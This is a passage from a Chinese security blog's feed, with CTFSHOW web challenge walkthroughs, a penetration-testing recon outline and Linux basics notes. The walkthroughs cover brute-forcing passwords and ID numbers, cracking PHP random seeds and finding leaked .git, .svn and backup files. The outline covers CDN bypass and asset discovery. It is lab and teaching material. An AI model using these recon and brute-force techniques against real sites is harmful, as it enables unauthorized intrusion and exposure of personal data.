id="web24">web24</h2><p>题目：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include("flag.php");if(isset($_GET['r'])){    $r = $_GET['r'];    mt_srand(372619038);    if(intval($r)===intval(mt_rand())){        echo $flag;    }}else{    highlight_file(__FILE__);    echo system('cat /proc/version');}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关考察PHP伪随机数种子，用简单代码跑出<mark>r</mark></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271359411.png" alt=""></p><p>传递r参数便可以得到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306011319995.png" alt=""></p><blockquote><ul class="lvl-1"><li class="lvl-2"><p>mt_srand() 播种 Mersenne Twister 随机数生成器。</p><p>语法：mt_srand(seed)</p></li><li class="lvl-2"><p>intval() 函数用于获取变量的整数值</p></li></ul></blockquote><h2 id="web25">web25</h2><p>题目：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include("flag.php");if(isset($_GET['r'])){    $r = $_GET['r'];    mt_srand(hexdec(substr(md5($flag), 0,8)));    $rand = intval($r)-intval(mt_rand());    if((!$rand)){        if($_COOKIE['token']==(mt_rand()+mt_rand())){            echo $flag;        }    }else{        echo $rand;    }}else{    highlight_file(__FILE__);    echo system('cat /proc/version');}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关因为我的环境有点问题，php_mt_seed跑不了，所以这一关我复现不了</p><h2 id="web26">web26</h2><p>这一关直接爆破抓包密码</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271359205.png" alt=""></p><h2 id="web27">web27</h2><p>这一关的思路：先点击查看录取名单，发现学生姓名和身份证号码关键信息，只不过身份证号码是不完整的，很明显，这就需要爆破</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271359173.png" alt=""></p><p>点击<mark>学生学籍信息查询系统</mark>后，发现它需要学生姓名和身份证号码才能才查询</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271359220.png" alt=""></p><p>接着就在把身份证号码作为变量进行爆破</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271359868.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306011319746.png" alt=""></p><p>奇怪的是我爆破后，没有发现结果，也不知道哪里出问题，还是环境问题。如果爆破出结果后，要把结果拿去Unicode编码一下才能看到文字信息，便可以拿到学号，然后再到用户登录，输入学号，密码是身份证号码。</p><blockquote><p>这一关如果用火狐浏览器，burp不能直接抓到这个页面的数据，需要用谷歌浏览器</p></blockquote><h2 id="web28">web28</h2><p>把目录中的==/0/2/==中的“0”和“2”分别设为变量，去掉2.txt，进行爆破：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271400534.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271400715.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271400724.png" alt=""></p><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTFSHOW </tag>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-web入门-信息收集</title>
      <link href="/posts/fd5.html"/>
      <url>/posts/fd5.html</url>
      
        <content type="html"><![CDATA[<h2 id="web1">web1</h2><p>直接F2查看源代码，或者ctrl+u查看源码，flag就在注释里面。</p><h2 id="web2">web2</h2><p>这一关它限制了鼠标右键和键盘F12，但ctrl+u便可看到源代码，flag就在注释里面。</p><h2 id="web3">web3</h2><p>打开，一看</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031101.png" alt=""></p><p>通过查看源代码，并没有看出有什么特殊的信息</p><p>使用burpsuite抓包后，发现响应包里面有flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031667.png" alt=""></p><p>其实用浏览器抓包也行，也一样可以在找到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031394.png" alt=""></p><h2 id="web4">web4</h2><p>根据题目提示，在robots.txt可能会重要信息，查看：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031376.png" alt=""></p><p>根据提示，访问==/flagishere.txt==，flag出来了</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031472.png" alt=""></p><h2 id="web5">web5</h2><p>根据题目提示，可能与phps源码泄露有关系</p><p>访问<mark>index.phps</mark>文件</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032553.png" alt=""></p><p>可以直接下载<mark>index.phps</mark>文件，查看文件内容，便可以看到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032441.png" alt=""></p><h2 id="web6">web6</h2><p>根据题目提示，应该在源码中有重要信息，通过目录扫描工具，可以扫出它有<mark>www.rar</mark>敏感文件，直接访问这个<mark>www.rar</mark>，便可以把源码下载下来，查看</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032042.png" alt=""></p><p>直接访问<mark>fl00g.txt</mark>，便可以得到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032832.png" alt=""></p><h2 id="web7">web7</h2><p>根据题目提示，<mark>版本控制很重要，但不要部署到生产环境更重要</mark>。这个可能是有些人在开发项目的时候会将自己的项目同步上传到GitHub这样的平台，会有==.git<mark>目录遗留，如果这种情况，他在部署环境如果不细心，把</mark>.gti==目录删除，就会遗留在已部署的环境中。</p><p>通过dirsearch扫描，能扫描到==.git==目录，直接访问，便可得到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032242.png" alt=""></p><h2 id="web8">web8</h2><p>这一关和上一个关，只不过这一个遗留目录是==.svn==</p><p>通过dirsearch扫描出来，直接访问，便可得到flag</p><h2 id="web9">web9</h2><p>这一关属于vim缓存信息泄露。</p><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>直接访问==/index.php.swp==，便可以下载<mark>index.php.svp</mark>文件，打开，查看，便可以得到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032705.png" alt=""></p><h2 id="web10">web10</h2><p>cookie里面应该有重要信息，直接抓包，便可以得到flag，比较简单</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032553.png" alt=""></p><h2 id="web11">web11</h2><p>这一关考的是域名解析</p><p>直接使用解析命令<code> nslookup -qt=txt flag.ctfshow.com</code></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033471.png" alt=""></p><blockquote><p>查询全部域名解析记录 基本格式：nslookup -query=any host [server]</p></blockquote><h2 id="web12">web12</h2><p>查看一下robots.txt文件，发现==/admin==，直接访问，需要用户名和密码，用户名应该是admin，根据题目提示，密码可能出现在页面中，再仔细看一下页面，密码应该是底下那个提示</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033738.png" alt=""></p><p>果真登录用户名admin以及密码372619038，便可获得flag</p><h2 id="web13">web13</h2><p>在页面下面发现document，查看后，下面发现后台地址以及用户名和密码</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033216.png" alt=""></p><p>打开后台地址，输入用户名和密码，就可以获取flag了</p><h2 id="web14">web14</h2><p>直接用<mark>dirsearch</mark>扫描敏感目录，发现==/editor==，访问，发现编辑器，点击上传文件按钮，看一下，发现里面可以看到空间文件，这个空间文件是属于服务器中的文件，在var/www/html中的nothingthere发现有一个文件fl000g.txt，访问==/nothinghere/fl000g.txt==便可以获取flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033017.png" alt=""></p><h2 id="web15">web15</h2><p>用dirsearch扫描到==/admin<mark>这个目录，直接访问，发现是一个后台登录系统，先试一下点击忘记密码，发现密保是填写城市，再首页中的qq邮箱，查到管理员属于西安，输入密保城市</mark>西安后便可以获取管理员密码，登录后台用户名admin，密码admin7789，便可以获取flag</p><h2 id="web16">web16</h2><blockquote><p>PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p></blockquote><p>访问==/tz.php==，然后再查看phpinfo，接着直接搜索ctf，便可以看到flag</p><h2 id="web17">web17</h2><p>使用dirsearch扫描出有==/backup.sql==这个敏感目录，直接访问便可以下载，下载后查看，搜索ctf，便可以看到flag</p><h2 id="web18">web18</h2><p>这一关很有意思，这是一个javascript 的游戏，从js代码中可知，当score&gt;120时，且game_over这个参数为false时，即可赢</p><p>打开浏览器的控制台</p><p>依次执行<code>score=130 game_over=false  run()</code>后</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033849.png" alt=""></p><p>根据访问<mark>110.php</mark>，后便可以得到flag，为什么要访问110.php，你念一下那句话就知道了</p><h2 id="web19">web19</h2><p>通过查看前端源代码，这道题关键信息在</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033397.png" alt=""></p><p>拿去解密，可得</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262034939.png" alt=""></p><p>输入用户名admin，密码i_want_a_36d_girl，便可以获取flag</p><h2 id="web20">web20</h2><blockquote><p>mdb文件是早期asp+access构架的数据库文件</p></blockquote><p>访问==/db/db.mdb==，便可以下载mdb文件，然后使用EasyAccess.exe打开搜索ctf，便可以获取flag，也可以用notepad++打开搜索ctf也可以获取flag</p><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/posts/970c.html"/>
      <url>/posts/970c.html</url>
      
        <content type="html"><![CDATA[<h2 id="架构">架构</h2><ol><li class="lvl-3">网站源码是什么语言<ul class="lvl-2"><li class="lvl-5">搜索引擎获取</li><li class="lvl-5">URL文件后缀</li><li class="lvl-5">搭建组合推算</li></ul></li><li class="lvl-3">网站中间件<ul class="lvl-2"><li class="lvl-5">通过返回数据包查看</li><li class="lvl-5">搭建组合推算</li><li class="lvl-5">端口扫描</li></ul></li><li class="lvl-3">数据库<ul class="lvl-2"><li class="lvl-5">通过常见的中间件与数据库的组合方式</li><li class="lvl-5">端口扫描</li></ul></li><li class="lvl-3">网站属于什么系统<ul class="lvl-2"><li class="lvl-5">大小区分<ul class="lvl-4"><li class="lvl-7">Windows大小不敏感</li><li class="lvl-7">Linux大小敏感</li></ul></li><li class="lvl-5">通过ping，查看TTL判断</li></ul></li></ol><h2 id="源码">源码</h2><ol><li class="lvl-3"><p>分类</p><ul class="lvl-2"><li class="lvl-5">开源CMS</li><li class="lvl-5">闭源购买</li><li class="lvl-5">自主研发</li></ul></li><li class="lvl-3"><p>获取方式1（针对开源CMS和闭源购买这两种情况）</p><ul class="lvl-2"><li class="lvl-5">直接购买或下载</li></ul></li><li class="lvl-3"><p>获取方式2（针对闭源购买和自主研发这两种情况）</p><ul class="lvl-2"><li class="lvl-5">composer.json</li><li class="lvl-5">git 源码泄露</li><li class="lvl-5">svn 源码泄露</li><li class="lvl-5">hg 源码泄露</li><li class="lvl-5">网站备份压缩文件</li><li class="lvl-5">WEB-INF/web.xml 泄露</li><li class="lvl-5">DS_Store 文件泄露</li><li class="lvl-5">SWP文件泄露</li><li class="lvl-5">CVS 泄露</li><li class="lvl-5">Bzr 泄露</li><li class="lvl-5">Github 源码泄露</li></ul></li><li class="lvl-3"><p>获取方式3</p><ul class="lvl-2"><li class="lvl-5">黑暗源码获取</li></ul></li><li class="lvl-3"><p>源码泄露</p><ul class="lvl-2"><li class="lvl-5">从源码本身的特性入口</li><li class="lvl-5">从管理员不好习惯入口</li><li class="lvl-5">从管理不好的配置入口</li><li class="lvl-5">从管理员不好的意识入口</li><li class="lvl-5">从管理员资源信息收集入口</li></ul></li></ol><h2 id="域名">域名</h2><ol><li class="lvl-3"><p>旁注</p></li><li class="lvl-3"><p>子域名</p></li><li class="lvl-3"><p>c段相似域名</p></li><li class="lvl-3"><p>反查域名</p></li></ol><h2 id="系统">系统</h2><ol><li class="lvl-3"><p>服务厂商</p></li><li class="lvl-3"><p>网络架构</p><ul class="lvl-2"><li class="lvl-5">外网搭建</li><li class="lvl-5">内网搭建</li></ul></li><li class="lvl-3"><p>应用协议</p><ul class="lvl-2"><li class="lvl-5">平台<ul class="lvl-4"><li class="lvl-7">nmap</li><li class="lvl-7">内网搭建</li></ul></li><li class="lvl-5">端口<ul class="lvl-4"><li class="lvl-7">数据库</li><li class="lvl-7">文件传输</li></ul></li></ul></li><li class="lvl-3"><p>网段资产</p><ul class="lvl-2"><li class="lvl-5">旁注</li><li class="lvl-5">c段</li></ul></li><li class="lvl-3"><p>阻碍</p><ul class="lvl-2"><li class="lvl-5"><p>CDN</p><p>可通过站长之家工具识别</p></li><li class="lvl-5"><p>Waf</p><p>识别：</p><ul class="lvl-4"><li class="lvl-7"><p>wafw00f（kaili自带的工具）</p></li><li class="lvl-7"><p>看图识别</p></li></ul></li><li class="lvl-5"><p>负载均衡</p><p>通过Ibd工具识别</p></li><li class="lvl-5"><p>防火墙</p><p>通过nmap也可以查看</p></li></ul></li><li class="lvl-3"><p>CDN绕过</p><ul class="lvl-2"><li class="lvl-5"><p>知识点</p><ol><li class="lvl-8">传统访问：用户访问域名–&gt;解析服务器 IP–&gt;访问目标主机</li><li class="lvl-8">普通 CDN：用户访问域名–&gt;CDN 节点–&gt;真实服务器 IP–&gt;访问目标主机</li><li class="lvl-8">带 WAF 的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt;真实服务器 IP–&gt;访问目标主机</li></ol></li><li class="lvl-5"><p>配置CND</p><p>配置 1：加速域名-需要启用加速的域名</p><p>配置 2：加速区域-需要启用加速的地区</p><p>配置 3：加速类型-需要启用加速的资源</p></li><li class="lvl-5"><p>绕过方法</p><ul class="lvl-4"><li class="lvl-7"><p>漏洞（SSRF）&amp;遗留文件问题（phpinfo。php）</p></li><li class="lvl-7"><p>分站域名</p></li><li class="lvl-7"><p>国外访问</p><p>代理 <a href="https://get-site-ip.com">https://get-site-ip.com</a></p></li><li class="lvl-7"><p>MX及邮件结合域名信息</p></li></ul></li><li class="lvl-5"><p>后续验证操作</p><p>通过修改本地hosts文件</p><ul class="lvl-4"><li class="lvl-7"><p>Windows hosts</p><p>C:\windows\System32\drivers\etc\hosts</p></li><li class="lvl-7"><p>Linux hosts</p><p>/etc/hosts</p></li></ul></li></ul></li><li class="lvl-3"><p>APP/小程序</p><ul class="lvl-2"><li class="lvl-5"><p>内在</p><ul class="lvl-4"><li class="lvl-7"><p>反编译</p></li><li class="lvl-7"><p>提取资源</p><p>黑暗引擎</p></li><li class="lvl-7"><p>工具项目</p><ul class="lvl-6"><li class="lvl-9">AppinfoScanner</li></ul></li></ul></li><li class="lvl-5"><p>外在</p><ul class="lvl-4"><li class="lvl-7"><p>抓包</p></li><li class="lvl-7"><p>封包</p></li><li class="lvl-7"><p>功能</p></li><li class="lvl-7"><p>工具</p><ul class="lvl-6"><li class="lvl-9"><p>针对HTTP/HTTPS</p><p>工具：</p><ul class="lvl-8"><li class="lvl-11"><p>Charles</p></li><li class="lvl-11"><p>Fiddler</p></li><li class="lvl-11"><p>Burpsuite</p></li></ul></li><li class="lvl-9"><p>针对其它协议</p><ul class="lvl-8"><li class="lvl-11">科来</li><li class="lvl-11">TCPDump</li><li class="lvl-11">Wireshark</li></ul></li></ul></li></ul></li><li class="lvl-5"><p>加固加壳</p><ul class="lvl-4"><li class="lvl-7">XP框架</li><li class="lvl-7">frida</li></ul></li></ul></li></ol><h2 id="工具项目推荐">工具项目推荐</h2><p>网络空间</p><ul class="lvl-0"><li class="lvl-2"><p>fofa</p></li><li class="lvl-2"><p>360Quake</p></li><li class="lvl-2"><p>Shodan</p></li><li class="lvl-2"><p>Zoomeye</p></li></ul><p>自动化项目</p><ul class="lvl-0"><li class="lvl-2"><p>ARL灯塔 <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p></li><li class="lvl-2"><p>Suize  <a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></p></li><li class="lvl-2"><p>Kunyu <a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p></li></ul><p>单点项目</p><ul class="lvl-0"><li class="lvl-2"><p>子域名</p><p><mark>Oneforall</mark></p></li><li class="lvl-2"><p>企查查</p><p><mark>Enscan</mark></p></li><li class="lvl-2"><p>指纹识别</p><p><mark>Finger</mark></p></li></ul><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务器基础知识</title>
      <link href="/posts/8b0b.html"/>
      <url>/posts/8b0b.html</url>
      
        <content type="html"><![CDATA[<h2 id="登录tty的快捷键">登录tty的快捷键</h2><ul class="lvl-0"><li class="lvl-2">Ctrl + Alt + F1：<strong>回到图形界面</strong></li><li class="lvl-2">Ctrl + Alt + F2：terminal 1（:0 大致等于tty 1）</li><li class="lvl-2">Ctrl + Alt + F3：terminal 2（tty2）</li><li class="lvl-2">Ctrl + Alt + F4：terminal 4（tty 3）</li><li class="lvl-2">Ctrl + Alt + F5：terminal 4（tty4）</li></ul><h2 id="打开图形模式终端的方式">打开图形模式终端的方式</h2><ul class="lvl-0"><li class="lvl-2"><p>调出系统搜索框，在搜索框中输入”terminal“</p></li><li class="lvl-2"><p>用快捷键来调出终端，比如可以自己设置快捷键：Ctrl + Alt + T</p></li></ul><h2 id="命令行">命令行</h2><ul class="lvl-0"><li class="lvl-2"><p>切换成root身份：<mark>sudo su</mark></p></li><li class="lvl-2"><p>退出root身份，可以用Ctrl + D 的组合键，或者用exit命令</p></li><li class="lvl-2"><p>检测当前用户身份命令：<mark>whoami</mark></p></li><li class="lvl-2"><p>检测当前主机名：<mark>hostname</mark></p></li><li class="lvl-2"><p>Linux的开发者们写了丰富详尽的命令使用手册，英语是<mark>manual</mark></p></li><li class="lvl-2"><p>显示当前日期信息：<mark>date</mark></p><p><mark>CST</mark>是Central Standard Time的缩写，表示“中央标准时间”</p></li><li class="lvl-2"><p>ls命令：ls是list的缩写。list是“列举，列出”的意思</p></li><li class="lvl-2"><p>命令参数：</p><p>参数是写在命令之后的一些补充选项。命令和参数之间有空格隔开</p><ol><li class="lvl-5"><p>短参数（一个字母）</p><ul class="lvl-4"><li class="lvl-7"><p>最常用的参数形式就是一个短横线后接一个字母：command -p</p></li><li class="lvl-7"><p>一次加好几个参数，可以用空格隔开：command -p -a -T -c</p></li><li class="lvl-7"><p>多个短参数也可以合并在一起：command -paTc</p></li><li class="lvl-7"><p>字母的大小写有区别，大写的T和小写的t通常含义不同</p></li></ul></li><li class="lvl-5"><p>长参数（多个字母）</p><ul class="lvl-4"><li class="lvl-7"><p>短参数是以一个短横线开始，而长参数是以两个短横线开始的</p></li><li class="lvl-7"><p>多格长参数，是不能像多个短参数那样合并写的</p></li><li class="lvl-7"><p>可以组合使用短参数和长参数</p></li><li class="lvl-7"><p>有时候，同一个意义的参数有短参数和长参数两种形式</p><p>效果是一样的：例如<mark>ls -a</mark>和<mark>ls --all</mark></p></li></ul></li><li class="lvl-5"><p>参数的值</p><ul class="lvl-4"><li class="lvl-7">有一些参数需要赋值。短参数和长参数的赋值方式不一样</li><li class="lvl-7">短参数赋值，通常是这样：command -p 10</li><li class="lvl-7">长参数赋值，通常是这样的：command --paremeter=10</li></ul></li></ol></li></ul><h2 id="如何查找命令和命令历史记录">如何查找命令和命令历史记录</h2><h3 id="如何找到一个命令">如何找到一个命令</h3><ul class="lvl-0"><li class="lvl-2"><p>有时候会想不起一个命令到底是如何拼写的</p></li><li class="lvl-2"><p>Linux的开发者们早就为我们准备了对策：用Tab键补全命令</p></li><li class="lvl-2"><p>Tab键可以补全命令，也可以补全文件名、路径名：按两次Tab键</p><blockquote><p>技巧：</p><ul class="lvl-3"><li class="lvl-2"><p>按一个下空格键，切换下一页</p></li><li class="lvl-2"><p>按一下回车键切换下一行</p></li><li class="lvl-2"><p>按一下Q键退出</p></li></ul></blockquote></li></ul><h3 id="命令的历史记录">命令的历史记录</h3><ul class="lvl-0"><li class="lvl-2"><p>向上键：按时间顺序向前查找用过的命令，每按一次就前进一个命令</p></li><li class="lvl-2"><p>向下键：按时间顺序向后查找用过的命令，每按一次就前进一个命令</p></li><li class="lvl-2"><p><mark>Ctrl + R</mark>：用于查找使用过的命令</p></li><li class="lvl-2"><p><mark>history</mark>命令：用于列出之前使用过的所有命令</p></li><li class="lvl-2"><p>可以用==！编号==这样的格式来重新运行history输出中对应编号的命令</p></li></ul><h2 id="一些实用的快捷键">一些实用的快捷键</h2><ul class="lvl-0"><li class="lvl-2"><p>Ctrl + L：用于清理终端的内容，就是清屏的作用。同clear命令</p></li><li class="lvl-2"><p>Ctrl + D给终端传递EOF（End Of File，文件结束符）</p></li><li class="lvl-2"><p>Shift + PgUp用于向上滚屏，与鼠标的滚轮向上滚屏是一个效果</p></li><li class="lvl-2"><p>Shift + PgDn 用于向下滚屏，与鼠标的滚轮向下滚屏是一个效果</p></li><li class="lvl-2"><p>Ctrl + A 光标跳到一行命令的开头。Home键有相同的效果</p></li><li class="lvl-2"><p>Ctrl + E 光标跳到一行命令的结尾。End键有相同的效果</p></li><li class="lvl-2"><p>Ctrl + U 删除所有在光标左侧的命令字符</p></li><li class="lvl-2"><p>Ctrl + K 删除所有光标右侧的命令字符</p></li><li class="lvl-2"><p>Ctrl + W删除光标左侧的一个“单词”</p><p>“单词”指用空格隔开的一个字符串。例如 -a 就是一个“单词”</p></li><li class="lvl-2"><p>Ctrl + Y 粘贴用 Ctrl + U，Ctrl + K</p><p>或Ctrl + W “删除”的字符串，有点像“剪切-粘贴”</p></li></ul><h2 id="文件组织">文件组织</h2><h3 id="Linux中两种类型的文件">Linux中两种类型的文件</h3><p>分类：</p><ol><li class="lvl-3"><p>普通的文件</p></li><li class="lvl-3"><p>特殊的文件</p></li></ol><p><strong>普通的文件：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>文本类型的文件（.txt，.doc，.odt，等等）</p></li><li class="lvl-2"><p>声音文件（.wav，.mp3，.ogg），还有程序，等</p></li></ul><p><strong>特殊的文件：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>其他一些文件时特殊的，因为它们表示一些东西</p><p>例如，你的光盘驱动器就是这类特殊的文件</p></li></ul><h3 id="根目录">根目录</h3><p><strong>windows中</strong></p><ul class="lvl-0"><li class="lvl-2"><p>可以有好几个根目录</p></li><li class="lvl-2"><p>C盘（C:\）是硬盘的根目录（假如没有把C盘分区的话）</p></li><li class="lvl-2"><p>H盘可能是光盘驱动器的根目录</p></li><li class="lvl-2"><p>一个目录的形式是这样的<mark>C:\Program Files\Baidu</mark></p><ul class="lvl-2"><li class="lvl-4">Baidu这个目录是Program Files这个目录的一个子目录</li><li class="lvl-4">Program Files这个目录是C盘这个目录的一个子目录</li><li class="lvl-4">Windows中用反斜杠 \ 来表明目录的层级与包含关系</li></ul></li></ul><p><strong>Linux中：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>Linux有且只有一个根目录，就是 / (斜杠)</p></li><li class="lvl-2"><p>Linux中没有比根目录再高一阶的目录了，没有目录包含根目录</p></li><li class="lvl-2"><p>Linux中用斜杠 / 来标明目录层级与包含关系</p><p>Linux的目录形式是这样的 /usr/bin</p><p>bin 是usr目录的子目录，usr 是 / 这个根目录的子目录</p></li></ul><h3 id="根目录的直属子目录">根目录的直属子目录</h3><p><strong>Windows的根目录的直属子目录：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>Windows的C盘这个根目录下一般都会找到一些相同的子目录</p></li></ul><p><strong>Linux的根目录的直属子目录：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>bin：英语binary的缩写，表示“二进制文件”，可执行文件为二进制文件，bin目录包含了会被所有用户使用的可执行程序</p></li><li class="lvl-2"><p>boot：英语boot表示“启动”，boot目录包含与Linux启动密切相关的文件</p></li><li class="lvl-2"><p>dev：英语device的缩写，表示“设备”</p><p>包含外设，它里面的子目录，每一个对应一个外设，比如代表光盘驱动器的文件就会出现在这个目录下面</p></li><li class="lvl-3"><p>etc：etc是法语et cetera的缩写，翻译成英语就是and so on，表示“……等等”</p></li></ul><p>etc目录包含系统的配置文件</p><ul class="lvl-0"><li class="lvl-2"><p>home：英语home表示“家”。用户的私人目录</p><p>在home目录中，放置私人的文件。类似Windows中的Documents文件夹，也叫“我的文档”</p><p>Linux中每个用户都在home目录下有一个私人目录（除了root）</p></li><li class="lvl-2"><p>lib：英语library的缩写，表示“库”</p><p>lib目录包含被程序所调用的库文件，例如 .so 结尾的文件</p><p><mark>Windows下这样的库文件则是以.dll结尾</mark></p></li><li class="lvl-2"><p>media：英语media表示“媒体”</p><p>可移动的外设（USB盘，SD卡，DVD，光盘，等等）插入电脑时，Linux可以让我们通过media的子目录来访问这些外设中的内容</p></li><li class="lvl-2"><p>mnt：英语mount的缩写，表示“挂载”</p><p>有点类似media目录，但一般用于临时挂载一些装置</p></li><li class="lvl-2"><p>opt：英语 optional application software package 的缩写</p><p>表示“可选的应用软件包”，用于安装多数第三方软件和插件</p></li><li class="lvl-2"><p>root：英语“根”的意思</p><p>超级用户root的根目录，一般的用户的根目录位于 /home下，root用户是个例外</p></li><li class="lvl-2"><p>sbin：英语system binary 的缩写，表示“系统二进制文件”</p><p>比bin目录多了一个前缀system（“系统”），sbin目录包含系统级的重要可执行程序</p></li><li class="lvl-2"><p>srv：英语service的缩写，表示“服务”</p><p>包含一些网络服务启动之后所需要的取用的数据</p></li><li class="lvl-2"><p>tmp：英语tamporary的缩写，表示“临时的”</p><p>普通用户和程序存放临时文件的地方</p></li><li class="lvl-2"><p>usr：是英语Unix Software Resource的缩写</p><p>表示“Unix操作系统软件资源（类似etc，属于历史遗留的命名），ust是最庞大的目录之一，类似Windows中的<mark>C:\Windows</mark>和<mark>C:\Program Files</mark>这两个文件夹的集合，usr目录里安装了大部分用户要调用的程序</p></li><li class="lvl-2"><p>var：英语variable的缩写，表示”动态的，可变的“</p><p>通常包含程序的数据，比如log（日志）文件</p></li></ul><p>以上目录的列表形式，在类Unix的操作系统里类似的</p><p><strong>参考资料：</strong><a href="https://linuxtoy.org/archives/linux-file-structure.html">Linux 文件结构 </a></p><blockquote><p>目录注意事项：</p><ul class="lvl-1"><li class="lvl-2">Windows的目录名称可以包含空格等符号，Linux也可以</li><li class="lvl-2">一般在Linux下命名目录时尽量不使用空格或者其他特殊的符号</li><li class="lvl-2">尽量用小写英文字母。这会省去一些不必要的麻烦</li></ul></blockquote><h2 id="pwd命令">pwd命令</h2><ul class="lvl-0"><li class="lvl-2"><p>pwd是Print Working Directory（”打印当前工作目录“）的缩写</p></li><li class="lvl-2"><p>显示当前目录的路径</p></li></ul><h2 id="which命令">which命令</h2><ul class="lvl-0"><li class="lvl-2"><p>用于显示一个命令的对应的可执行文件的位置</p></li><li class="lvl-2"><p>Linux下，每一条命令其实对应了一个可执行程序</p><p>在终端汇总输入命令，按回车键的时候，就是执行了对应的那个程序，如，pwd命令对应的pwd程序就是存在于Linux中的 /usr/bin 目录中</p></li><li class="lvl-2"><p>which命令接受一个参数，参数是你想知道可执行程序位于哪里的那个命令</p></li></ul><blockquote><p>注：Windows可执行程序以.exe结尾，Linux中一般是没有后缀名的。</p></blockquote><h2 id="ls命令">ls命令</h2><ul class="lvl-0"><li class="lvl-2"><p>ls命令：列出文件和目录</p></li><li class="lvl-2"><p>可以加上参数 --color=auto 来开启颜色：<mark>ls --color=auto</mark></p></li><li class="lvl-2"><p>可以用 --color=none来关闭颜色标注：<mark>ls --color=none</mark></p></li></ul><p><strong>ls 常用的参数：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>-a：显示所有文件和目录，包括隐藏的</p></li><li class="lvl-2"><p>-A：它的作用和小写的==-a<mark>几乎一样，唯一不同的是</mark>-A== 不列出==.== 和 <mark>…</mark> 这两个文件</p></li><li 